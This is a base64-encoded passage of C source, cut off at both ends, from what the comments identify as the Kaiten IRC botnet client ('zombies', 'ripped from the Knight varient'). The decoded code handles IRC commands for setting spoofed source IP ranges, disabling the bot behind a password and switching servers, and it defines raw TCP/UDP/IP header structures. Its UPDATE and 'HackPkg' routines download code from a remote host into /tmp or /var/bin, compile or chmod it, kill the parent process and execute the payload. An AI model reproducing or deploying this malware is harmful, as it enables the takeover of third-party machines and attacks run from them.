hZGRyICopJnNlcnZlciwgc2l6ZW9mKHNlcnZlcikpICE9IDApIHsKICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpVbmFibGUgdG8gY29ubmVjdCB0byBodHRwLlxuIixzZW5kZXIpOwogICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICB9CgogICAgICAgIFNlbmQoc29jazIsIkdFVCAvJXMgSFRUUC8xLjBcclxuQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5Vc2VyLUFnZW50OiBNb3ppbGxhLzQuNzUgW2VuXSAoWDExOyBVOyBMaW51eCAyLjIuMTYtMyBpNjg2KVxyXG5Ib3N0OiAlczo4MFxyXG5BY2NlcHQ6IGltYWdlL2dpZiwgaW1hZ2UveC14Yml0bWFwLCBpbWFnZS9qcGVnLCBpbWFnZS9wanBlZywgaW1hZ2UvcG5nLCAqL1x4MmFcclxuQWNjZXB0LUVuY29kaW5nOiBnemlwXHJcbkFjY2VwdC1MYW5ndWFnZTogZW5cclxuQWNjZXB0LUNoYXJzZXQ6IGlzby04ODU5LTEsKix1dGYtOFxyXG5cclxuIixidWYraSsxLGJ1Zik7CiAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlJlY2VpdmluZyBmaWxlLlxuIixzZW5kZXIpOwogICAgICAgIGZpbGU9Zm9wZW4oYXJndlsyXSwid2IiKTsKICAgICAgICB3aGlsZSgxKSB7CiAgICAgICAgICAgICAgICBpbnQgaTsKICAgICAgICAgICAgICAgIGlmICgoaT1yZWN2KHNvY2syLGJ1Zm0sNDA5NiwwKSkgPD0gMCkgYnJlYWs7CiAgICAgICAgICAgICAgICBpZiAoaSA8IDQwOTYpIGJ1Zm1baV09MDsKICAgICAgICAgICAgICAgIGZvciAoZD0wO2Q8aTtkKyspIGlmICghc3RybmNtcChidWZtK2QsIlxyXG5cclxuIiw0KSkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGQrPTQ7ZDxpO2QrKykgZnB1dGMoYnVmbVtkXSxmaWxlKTsKICAgICAgICAgICAgICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBkb25lOgogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpTYXZlZCBhcyAlc1xuIixzZW5kZXIsYXJndlsyXSk7CiAgICAgICAgd2hpbGUoMSkgewogICAgICAgICAgICAgICAgaW50IGksZDsKICAgICAgICAgICAgICAgIGlmICgoaT1yZWN2KHNvY2syLGJ1Zm0sNDA5NiwwKSkgPD0gMCkgYnJlYWs7CiAgICAgICAgICAgICAgICBpZiAoaSA8IDQwOTYpIGJ1Zm1baV09MDsKICAgICAgICAgICAgICAgIGZvciAoZD0wO2Q8aTtkKyspIGZwdXRjKGJ1Zm1bZF0sZmlsZSk7CiAgICAgICAgfQogICAgICAgIGZjbG9zZShmaWxlKTsKICAgICAgICBjbG9zZShzb2NrMik7CiAgICAgICAgZXhpdCgwKTsKfQp2b2lkIGdldHNwb29mcyhpbnQgc29jaywgY2hhciAqc2VuZGVyLCBpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgICAgICB1bnNpZ25lZCBsb25nIGE9c3Bvb2ZzLGI9c3Bvb2ZzKyhzcG9vZnNtLTEpOwogICAgICAgIGlmIChzcG9vZnNtID09IDEpIFNlbmQoc29jaywiTk9USUNFICVzIDpTcG9vZnM6ICVkLiVkLiVkLiVkXG4iLHNlbmRlciwoKHVfY2hhciopJmEpWzNdLCgodV9jaGFyKikmYSlbMl0sKCh1X2NoYXIqKSZhKVsxXSwoKHVfY2hhciopJmEpWzBdKTsKICAgICAgICBlbHNlIFNlbmQoc29jaywiTk9USUNFICVzIDpTcG9vZnM6ICVkLiVkLiVkLiVkIC0gJWQuJWQuJWQuJWRcbiIsc2VuZGVyLCgodV9jaGFyKikmYSlbM10sKCh1X2NoYXIqKSZhKVsyXSwoKHVfY2hhciopJmEpWzFdLCgodV9jaGFyKikmYSlbMF0sKCh1X2NoYXIqKSZiKVszXSwoKHVfY2hhciopJmIpWzJdLCgodV9jaGFyKikmYilbMV0sKCh1X2NoYXIqKSZiKVswXSk7Cn0Kdm9pZCB2ZXJzaW9uKGludCBzb2NrLCBjaGFyICpzZW5kZXIsIGludCBhcmdjLCBjaGFyICoqYXJndikgewogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpGbGliaWRpIEZsYWJlZGkgRmx1cHBcbiBEbyB5b3UgdGhpbmsgb2Ygc3VjaCBhbiB1bmNyZWF0aXZlIG5hbWUgYWdhaW4hIHhEIixzZW5kZXIpOwp9CnZvaWQgbmlja2MoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgaWYgKGFyZ2MgIT0gMSkgewogICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOk5JQ0sgPG5pY2s+XG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIGlmIChzdHJsZW4oYXJndlsxXSkgPj0gMTApIHsKICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpOaWNrIGNhbm5vdCBiZSBsYXJnZXIgdGhhbiA5IGNoYXJhY3RlcnMuXG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIFNlbmQoc29jaywiTklDSyAlc1xuIixhcmd2WzFdKTsKfQovLyBCcm91Z2h0IGJhY2sgdGhlc2UgZmVhdHVyZXMgZnJvbSB0aGUgZGVhZC4uLiBub3cga2FpdGVuIGhhcyBhdXRoIGFnYWluLgp2b2lkIGRpc2FibGUoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgaWYgKGFyZ2MgIT0gMSkgewogICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkRJU0FCTEUgPHBhc3M+XG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6Q3VycmVudCBzdGF0dXMgaXM6ICVzLlxuIixzZW5kZXIsZGlzYWJsZWQ/IkRpc2FibGVkIjoiRW5hYmxlZCBhbmQgYXdhaXRpbmcgb3JkZXJzIik7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoJaWYgKGRpc2FibGVkKSB7CgkJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkFscmVhZHkgZGlzYWJsZWQuXG4iLHNlbmRlcik7CgkJcmV0dXJuOwoJfQoJaWYgKHN0cmxlbihhcmd2WzFdKSA+IDI1NCkgewogICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlBhc3N3b3JkIHRvbyBsb25nISA+IDI1NFxuIixzZW5kZXIpOwogICAgICAgICAgICAgICAgcmV0dXJuOwoJfQogICAgICAgIGRpc2FibGVkPTE7CgltZW1zZXQoZGlzcGFzcywwLDI1Nik7CglzdHJjcHkoZGlzcGFzcyxhcmd2WzFdKTsKCVNlbmQoc29jaywiTk9USUNFICVzIDpEaXNhYmxlIHN1Y2Vzc2Z1bC5cbiIpOwp9CnZvaWQgZW5hYmxlKGludCBzb2NrLCBjaGFyICpzZW5kZXIsIGludCBhcmdjLCBjaGFyICoqYXJndikgewogICAgICAgIGlmIChhcmdjICE9IDEpIHsKICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpFTkFCTEUgPHBhc3M+XG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6Q3VycmVudCBzdGF0dXMgaXM6ICVzLlxuIixzZW5kZXIsZGlzYWJsZWQ/IkRpc2FibGVkIjoiRW5hYmxlZCBhbmQgYXdhaXRpbmcgb3JkZXJzIik7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoJaWYgKCFkaXNhYmxlZCkgewoJCVNlbmQoc29jaywiTk9USUNFICVzIDpBbHJlYWR5IGVuYWJsZWQuXG4iLHNlbmRlcik7CgkJcmV0dXJuOwoJfQoJaWYgKHN0cmNhc2VjbXAoZGlzcGFzcyxhcmd2WzFdKSkgewoJCVNlbmQoc29jaywiTk9USUNFICVzIDpXcm9uZyBwYXNzd29yZFxuIixzZW5kZXIpOwoJCXJldHVybjsKCX0KICAgICAgICBkaXNhYmxlZD0wOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlBhc3N3b3JkIGNvcnJlY3QuXG4iLHNlbmRlcik7Cn0Kdm9pZCBzcG9vZihpbnQgc29jaywgY2hhciAqc2VuZGVyLCBpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgICAgICBjaGFyIGlwWzI1Nl07CiAgICAgICAgaW50IGksIG51bTsKICAgICAgICB1bnNpZ25lZCBsb25nIHVpcDsKICAgICAgICBpZiAoYXJnYyAhPSAxKSB7CiAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6UmVtb3ZlZCBhbGwgc3Bvb2ZzXG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICBzcG9vZnM9MDsKICAgICAgICAgICAgICAgIHNwb29mc209MDsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgaWYgKHN0cmxlbihhcmd2WzFdKSA+IDE2KSB7CiAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6V2hhdCBraW5kIG9mIHN1Ym5ldCBhZGRyZXNzIGlzIHRoYXQ/IERvIHNvbWV0aGluZyBsaWtlOiAxNjkuNDBcbiIsc2VuZGVyKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgc3RyY3B5KGlwLGFyZ3ZbMV0pOwogICAgICAgIGlmIChpcFtzdHJsZW4oaXApLTFdID09ICcuJykgaXBbc3RybGVuKGlwKS0xXSA9IDA7CiAgICAgICAgZm9yIChpPTAsIG51bT0xO2k8c3RybGVuKGlwKTtpKyspIGlmIChpcFtpXSA9PSAnLicpIG51bSsrOwogICAgICAgIG51bT0tKG51bS00KTsKICAgICAgICBmb3IgKGk9MDtpPG51bTtpKyspIHN0cmNhdChpcCwiLjAiKTsKICAgICAgICB1aXA9aW5ldF9uZXR3b3JrKGlwKTsKICAgICAgICBpZiAobnVtID09IDApIHNwb29mc209MTsKICAgICAgICBlbHNlIHNwb29mc209cG93KDI1NixudW0pOwogICAgICAgIHNwb29mcz11aXA7Cn0Kc3RydWN0IGlwaGRyIHsKICAgICAgICB1bnNpZ25lZCBpbnQgaWhsOjQsIHZlcnNpb246NDsKICAgICAgICB1bnNpZ25lZCBjaGFyIHRvczsKICAgICAgICB1bnNpZ25lZCBzaG9ydCB0b3RfbGVuOwogICAgICAgIHVuc2lnbmVkIHNob3J0IGlkOwogICAgICAgIHVuc2lnbmVkIHNob3J0IGZyYWdfb2ZmOwogICAgICAgIHVuc2lnbmVkIGNoYXIgdHRsOwogICAgICAgIHVuc2lnbmVkIGNoYXIgcHJvdG9jb2w7CiAgICAgICAgdW5zaWduZWQgc2hvcnQgY2hlY2s7CiAgICAgICAgdW5zaWduZWQgbG9uZyBzYWRkcjsKICAgICAgICB1bnNpZ25lZCBsb25nIGRhZGRyOwp9OwpzdHJ1Y3QgdWRwaGRyIHsKICAgICAgICB1bnNpZ25lZCBzaG9ydCBzb3VyY2U7CiAgICAgICAgdW5zaWduZWQgc2hvcnQgZGVzdDsKICAgICAgICB1bnNpZ25lZCBzaG9ydCBsZW47CiAgICAgICAgdW5zaWduZWQgc2hvcnQgY2hlY2s7Cn07CnN0cnVjdCB0Y3BoZHIgewogICAgICAgIHVuc2lnbmVkIHNob3J0IHNvdXJjZTsKICAgICAgICB1bnNpZ25lZCBzaG9ydCBkZXN0OwogICAgICAgIHVuc2lnbmVkIGxvbmcgc2VxOwogICAgICAgIHVuc2lnbmVkIGxvbmcgYWNrX3NlcTsKICAgICAgICB1bnNpZ25lZCBzaG9ydCByZXMxOjQsIGRvZmY6NDsKCXVuc2lnbmVkIGNoYXIgZmluOjEsIHN5bjoxLCByc3Q6MSwgcHNoOjEsIGFjazoxLCB1cmc6MSwgZWNlOjEsIGN3cjoxOwogICAgICAgIHVuc2lnbmVkIHNob3J0IHdpbmRvdzsKICAgICAgICB1bnNpZ25lZCBzaG9ydCBjaGVjazsKICAgICAgICB1bnNpZ25lZCBzaG9ydCB1cmdfcHRyOwp9OwpzdHJ1Y3Qgc2VuZF90Y3AgewoJc3RydWN0IGlwaGRyIGlwOwoJc3RydWN0IHRjcGhkciB0Y3A7CgljaGFyIGJ1ZlsyMF07Cn07CnN0cnVjdCBwc2V1ZG9faGVhZGVyIHsKCXVuc2lnbmVkIGludCBzb3VyY2VfYWRkcmVzczsKCXVuc2lnbmVkIGludCBkZXN0X2FkZHJlc3M7Cgl1bnNpZ25lZCBjaGFyIHBsYWNlaG9sZGVyOwoJdW5zaWduZWQgY2hhciBwcm90b2NvbDsKCXVuc2lnbmVkIHNob3J0IHRjcF9sZW5ndGg7CglzdHJ1Y3QgdGNwaGRyIHRjcDsKCWNoYXIgYnVmWzIwXTsKfTsKdW5zaWduZWQgaW50IGhvc3QyaXAoY2hhciAqc2VuZGVyLGNoYXIgKmhvc3RuYW1lKSB7CiAgICAgICAgc3RhdGljIHN0cnVjdCBpbl9hZGRyIGk7CiAgICAgICAgc3RydWN0IGhvc3RlbnQgKmg7CiAgICAgICAgaWYoKGkuc19hZGRyID0gaW5ldF9hZGRyKGhvc3RuYW1lKSkgPT0gLTEpIHsKICAgICAgICAgICAgICAgIGlmKChoID0gZ2V0aG9zdGJ5bmFtZShob3N0bmFtZSkpID09IE5VTEwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VuZChzb2NrLCAiTk9USUNFICVzIDpVbmFibGUgdG8gcmVzb2x2ZSAlc1xuIiwgc2VuZGVyLGhvc3RuYW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJjb3B5KGgtPmhfYWRkciwgKGNoYXIgKikmaS5zX2FkZHIsIGgtPmhfbGVuZ3RoKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGkuc19hZGRyOwp9CgoKCgoKCi8vIFNoYW1lbGVzc2x5IHJpcHBlZCBmcm9tIHRoZSBLbmlnaHQgdmFyaWVudCAoYW5kIGltcHJvdmVkISkKdm9pZCB1cGRhdGUoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CglpbnQgc29jazIsaSxkOwoJc3RydWN0IHNvY2thZGRyX2luIHNlcnZlcjsKCXVuc2lnbmVkIGxvbmcgaXBhZGRyOwoJdW5zaWduZWQgY2hhciBkZ2NjOwoJY2hhciBidWZbMTAyNF0sICpmaWxlOwoJRklMRSAqZ2NjOwoJaW50IHBhcmVudD1nZXRwaWQoKTsKCWlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKCWlmIChhcmdjIDwgMikgewoJCVNlbmQoc29jaywiTk9USUNFICVzIDpVUERBVEVIVFRQIDxob3N0PiA8c3JjOmJpbj5cbiIsc2VuZGVyKTsKCQlleGl0KDApOwoJfQoJaWYgKChzb2NrMiA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCkpID09IC0xKSB7CgkJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlVuYWJsZSB0byBjcmVhdGUgc29ja2V0IChXaWVyZCwgeW91IHNob3VsZG50IGdldCB0aGlzIGVycm9yIGFuZCBJVFMgTk9UIE1ZIEZBVUxUISkuXG4iLHNlbmRlcik7CgkJZXhpdCgwKTsKCX0KCXNlcnZlci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKCXNlcnZlci5zaW5fcG9ydCA9IGh0b25zKDgwKTsKCWlmICgoaXBhZGRyID0gaW5ldF9hZGRyKGFyZ3ZbMV0pKSA9PSAtMSkgewoJCXN0cnVjdCBob3N0ZW50ICpob3N0bTsKCQlpZiAoKGhvc3RtPWdldGhvc3RieW5hbWUoYXJndlsxXSkpID09IE5VTEwpIHsKCQkJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlVuYWJsZSB0byByZXNvbHZlIGFkZHJlc3MuXG4iLHNlbmRlcik7CgkJCWV4aXQoMCk7CgkJfQoJCW1lbWNweSgoY2hhciopJnNlcnZlci5zaW5fYWRkciwgaG9zdG0tPmhfYWRkciwgaG9zdG0tPmhfbGVuZ3RoKTsKCX0KCWVsc2Ugc2VydmVyLnNpbl9hZGRyLnNfYWRkciA9IGlwYWRkcjsKCW1lbXNldCgmKHNlcnZlci5zaW5femVybyksIDAsIDgpOwoJaWYgKGNvbm5lY3Qoc29jazIsKHN0cnVjdCBzb2NrYWRkciAqKSZzZXJ2ZXIsIHNpemVvZihzZXJ2ZXIpKSAhPSAwKSB7CgkJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlVuYWJsZSB0byBjb25uZWN0IHRvIGh0dHAuXG4iLHNlbmRlcik7CgkJZXhpdCgwKTsKCX0KCglnY2M9cG9wZW4oImdjYyAtLWhlbHAiLCJyIik7CglpZiAoZ2NjICE9IE5VTEwpIHsKCQltZW1zZXQoYnVmLDAsMTAyNCk7CgkJZmdldHMoYnVmLDEwMjQsZ2NjKTsKCQlpZiAoIXN0cnN0cihidWYsIlVzYWdlIikpIGRnY2M9MDsKCQllbHNlIGRnY2M9MTsKCQlwY2xvc2UoZ2NjKTsKCX0gZWxzZSBkZ2NjPTA7CgoJZm9yIChpPTA7aTxzdHJsZW4oYXJndlsyXSkgJiYgYXJndlsyXVtpXSAhPSAnOic7aSsrKTsKCWFyZ3ZbMl1baV09MDsKCWlmIChkZ2NjKSBmaWxlPWFyZ3ZbMl07CgllbHNlIGZpbGU9YXJndlsyXStpKzE7CgkKCVNlbmQoc29jazIsIkdFVCAvJXMgSFRUUC8xLjBcclxuQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5Vc2VyLUFnZW50OiBNb3ppbGxhLzQuNzUgW2VuXSAoWDExOyBVOyBMaW51eCAyLjIuMTYtMyBpNjg2KVxyXG5Ib3N0OiAlczo4MFxyXG5BY2NlcHQ6IGltYWdlL2dpZiwgaW1hZ2UveC14Yml0bWFwLCBpbWFnZS9qcGVnLCBpbWFnZS9wanBlZywgaW1hZ2UvcG5nLCAqL1x4MmFcclxuQWNjZXB0LUVuY29kaW5nOiBnemlwXHJcbkFjY2VwdC1MYW5ndWFnZTogZW5cclxuQWNjZXB0LUNoYXJzZXQ6IGlzby04ODU5LTEsKix1dGYtOFxyXG5cclxuIixmaWxlLGFyZ3ZbMV0pOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlJlY2VpdmluZyB1cGRhdGUuXG4iLHNlbmRlcik7CglzeXN0ZW0oIm1rZGlyIC90bXAiKTsKCWlmIChkZ2NjKSB7CgkJRklMRSAqZmlsZT1mb3BlbigiL3RtcC8uYyIsIndiIik7CgkJY2hhciBidWZtWzQwOTZdOwoJCXdoaWxlKDEpIHsKCQkJaW50IGk7CgkJCWlmICgoaT1yZWN2KHNvY2syLGJ1Zm0sNDA5NiwwKSkgPD0gMCkgYnJlYWs7CgkJCWlmIChpIDwgNDA5NikgYnVmbVtpXT0wOwoJCQlmb3IgKGQ9MDtkPGk7ZCsrKSBpZiAoIXN0cm5jbXAoYnVmbStkLCJcclxuXHJcbiIsNCkpIHsKCQkJCWZvciAoZCs9NDtkPGk7ZCsrKSBmcHV0YyhidWZtW2RdLGZpbGUpOwoJCQkJZ290byBkb25lOwoJCQl9CgkJfQoJCWRvbmU6CgkJd2hpbGUoMSkgewoJCQlpbnQgaTsKCQkJaWYgKChpPXJlY3Yoc29jazIsYnVmbSw0MDk2LDApKSA8PSAwKSBicmVhazsKCQkJaWYgKGkgPCA0MDk2KSBidWZtW2ldPTA7CgkJCWZvciAoZD0wO2Q8aTtkKyspIGZwdXRjKGJ1Zm1bZF0sZmlsZSk7CgkJfQoJCWZjbG9zZShmaWxlKTsKCQltZW1zZXQoYnVmLDAsNDA5Nik7CgkJc3ByaW50ZihidWYsIihnY2MgLW8gJXMgL3RtcC8uYzsgcm0gLXJmIC90bXAvLmM7IGtpbGwgLTkgJWQ7ICVzICYpID4gL2Rldi9udWxsIDI+JjEiLGV4ZWNmaWxlLHBhcmVudCxleGVjZmlsZSk7Cgl9CgllbHNlIHsKCQlGSUxFICpmaWxlPWZvcGVuKCIvdG1wLy5vIiwid2IiKTsKCQl1bnNpZ25lZCBjaGFyIGJ1Zm1bNDA5Nl07CgkJd2hpbGUoMSkgewoJCQlpbnQgaTsKCQkJaWYgKChpPXJlY3Yoc29jazIsYnVmbSw0MDk2LDApKSA8PSAwKSBicmVhazsKCQkJaWYgKGkgPCA0MDk2KSBidWZtW2ldPTA7CgkJCWZvciAoZD0wO2Q8aTtkKyspIGlmICghc3RybmNtcChidWZtK2QsIlxyXG5cclxuIiw0KSkgewoJCQkJZm9yIChkKz00O2Q8aTtkKyspIGZwdXRjKGJ1Zm1bZF0sZmlsZSk7CgkJCQlnb3RvIGRvbmUyOwoJCQl9CgkJfQoJCWRvbmUyOgoJCXdoaWxlKDEpIHsKCQkJaW50IGksZDsKCQkJaWYgKChpPXJlY3Yoc29jazIsYnVmbSw0MDk2LDApKSA8PSAwKSBicmVhazsKCQkJaWYgKGkgPCA0MDk2KSBidWZtW2ldPTA7CgkJCWZvciAoZD0wO2Q8aTtkKyspIGZwdXRjKGJ1Zm1bZF0sZmlsZSk7CgkJfQoJCWZjbG9zZShmaWxlKTsKCQltZW1zZXQoYnVmLDAsNDA5Nik7Ci8vIFlvdSBtYXkgaGF2ZSB0byBwbGF5IGFyb3VuZCB3aXRoIHRoaXMgYSBiaXQgaWYgeW91ciB6b21iaWVzIGRvbid0IGhhdmUga2lsbGFsbCBvciBzbGVlcCB0cnkgdGhpczoKLy8gLy9zcHJpbnRmKGJ1ZiwiKGNobW9kIDc1NSAvdG1wLy5vO2tpbGwgLTkgJWQ7IGtpbGwgLTkgJWQ7dHJhcCAnJyAxIDI7IC90bXAvLm8gJikgPiAvZGV2L251bGwiLGFjdHVhbHBhcmVudCxwYXJlbnQsZXhlY2ZpbGUpOwovLyBPdGhlcndpc2UgcnVuIEdFVEJCIGZpcnN0LCBhbmQgdGhhbiB0aGlzIHdpbGwgd29yayBqdXN0IGZpbmU6CgkJc3ByaW50ZihidWYsImV4cG9ydCBQQVRIPS92YXIvYmluOi91c3Ivc2JpbjovYmluOi91c3IvYmluOi9zYmluO2V4cG9ydCBIT01FPS90bXA7Y2htb2QgK3ggL3RtcC8ubzsgdHJhcCAnJyAxO3NoIC1jICdraWxsYWxsIGthaXRlbio7a2lsbGFsbCBrdCo7a2lsbGFsbCAubztzbGVlcCA1O3RyYXAgIiIgMTsvdG1wLy5vICcmIik7Cgl9CgljbG9zZShzb2NrKTsKCWNsb3NlKHNvY2syKTsKCXN5c3RlbShidWYpOwoJa2lsbCg5LDApOwoJZXhpdCgwKTsKfQoKLy8gU3dpdGNoIHNlcnZlcnMuIE5vdCBhIHNlY3VyaXR5IGhvbGUgaWYgeW91IGNvbmZpZ3VyZSB5b3VyIElSQ0QgcHJvcGVybHkhCnZvaWQgbW92ZShpbnQgc29jaywgY2hhciAqc2VuZGVyLCBpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgICAgICBpZiAoYXJnYyA8IDEpIHsKICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpNT1ZFIDxzZXJ2ZXI+XG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICBleGl0KDEpOwogICAgICAgIH0KCXNlcnZlcj1zdHJkdXAoYXJndlsxXSk7CgljaGFuZ2VzZXJ2ZXJzPTE7CgljbG9zZShzb2NrKTsKfQovKgoqIEthaXRlbiBub3cgaGFzIGl0J3Mgb3duIHBhY2thZ2UgbWFuZ2VyISBTaGVsbHogcHJvdWRseSBwcmVzZW50cyBIYWNrUGtnIQoqICAgICAgICAgIC4uLiBhIHZlcnkgaGFja3kgcGFja2FnZSBtYW5nZXIgaW5kZWVkIQoqLwp2b2lkIGhhY2twa2coaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgaW50IHNvY2syLGksZDsKICAgICAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gc2VydmVyOwogICAgICAgIHVuc2lnbmVkIGxvbmcgaXBhZGRyOwogICAgICAgIGNoYXIgYnVmWzEwMjRdOwogICAgICAgIEZJTEUgKmZpbGU7Cglta2RpcigiL3Zhci9iaW4iLCAwNzc1KTsKICAgICAgICB1bnNpZ25lZCBjaGFyIGJ1Zm1bNDA5Nl07CiAgICAgICAgaWYgKG1mb3JrKHNlbmRlcikgIT0gMCkgcmV0dXJuOwogICAgICAgIGlmIChhcmdjIDwgMikgewogICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkhBQ0tQR0sgPHVybD4gPGJpbmFyeSBuYW1lPlxuIixzZW5kZXIpOwogICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICB9CiAgICAgICAgaWYgKChzb2NrMiA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCkpID09IC0xKSB7CiAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6VW5hYmxlIHRvIGNyZWF0ZSBzb2NrZXQuXG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICBleGl0KDApOwogICAgICAgIH0KICAgICAgICBpZiAoIXN0cm5jbXAoYXJndlsxXSwiaHR0cDovLyIsNykpIHN0cmNweShidWYsYXJndlsxXSs3KTsKICAgICAgICBlbHNlIHN0cmNweShidWYsYXJndlsxXSk7CiAgICAgICAgZm9yIChpPTA7aTxzdHJsZW4oYnVmKSAmJiBidWZbaV0gIT0gJy8nO2krKyk7CiAgICAgICAgYnVmW2ldPTA7CiAgICAgICAgc2VydmVyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgICAgIHNlcnZlci5zaW5fcG9ydCA9IGh0b25zKDgwKTsKICAgICAgICBpZiAoKGlwYWRkciA9IGluZXRfYWRkcihidWYpKSA9PSAtMSkgewogICAgICAgICAgICAgICAgc3RydWN0IGhvc3RlbnQgKmhvc3RtOwogICAgICAgICAgICAgICAgaWYgKChob3N0bT1nZXRob3N0YnluYW1lKGJ1ZikpID09IE5VTEwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlVuYWJsZSB0byByZXNvbHZlIGFkZHJlc3MuXG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBtZW1jcHkoKGNoYXIqKSZzZXJ2ZXIuc2luX2FkZHIsIGhvc3RtLT5oX2FkZHIsIGhvc3RtLT5oX2xlbmd0aCk7CiAgICAgICAgfQogICAgICAgIGVsc2Ugc2VydmVyLnNpbl9hZGRyLnNfYWRkciA9IGlwYWRkcjsKICAgICAgICBtZW1zZXQoJihzZXJ2ZXIuc2luX3plcm8pLCAwLCA4KTsKICAgICAgICBpZiAoY29ubmVjdChzb2NrMiwoc3RydWN0IHNvY2thZGRyICopJnNlcnZlciwgc2l6ZW9mKHNlcnZlcikpICE9IDApIHsKICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpVbmFibGUgdG8gY29ubmVjdCB0byBodHRwLlxuIixzZW5kZXIpOwogICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICB9CgogICAgICAgIFNlbmQoc29jazIsIkdFVCAvJXMgSFRUUC8xLjBcclxuQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5Vc2VyLUFnZW50OiBIYWNrWmlsbGEvMS42NyBbZW5dIChYMTE7IFU7IExpbnV4IDIuMi4xNi0zIHg2NClcclxuSG9zdDogJXM6ODBcclxuQWNjZXB0OiBpbWFnZS9naWYsIGltYWdlL3gteGJpdG1hcCwgaW1hZ2UvanBlZywgaW1hZ2UvcGpwZWcsIGltYWdlL3BuZywgKi9ceDJhXHJcbkFjY2VwdC1FbmNvZGluZzogZ3ppcFxyXG5BY2NlcHQtTGFuZ3VhZ2U6IGVuXHJcbkFjY2VwdC1DaGFyc2V0OiBpc28tODg1OS0xLCosdXRmLThcclxuXHJcbiIsYnVmK2krMSxidWYpOwogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpSZWNlaXZpbmcgZmlsZS5cbiIsc2VuZGVyKTsKICAgICAgICBmaWxlPWZvcGVuKGFyZ3ZbMl0sIndiIik7CiAgICAgICAgd2hpbGUoMSkgewogICAgICAgICAgICAgICAgaW50IGk7CiAgICAgICAgICAgICAgICBpZiAoKGk9cmVjdihzb2NrMixidWZtLDQwOTYsMCkpIDw9IDApIGJyZWFrOwogICAgICAgICAgICAgICAgaWYgKGkgPCA0MDk2KSBidWZtW2ldPTA7CiAgICAgICAgICAgICAgICBmb3IgKGQ9MDtkPGk7ZCsrKSBpZiAoIXN0cm5jbXAoYnVmbStkLCJcclxuXHJcbiIsNCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChkKz00O2Q8aTtkKyspIGZwdXRjKGJ1Zm1bZF0sZmlsZSk7CiAgICAgICAgI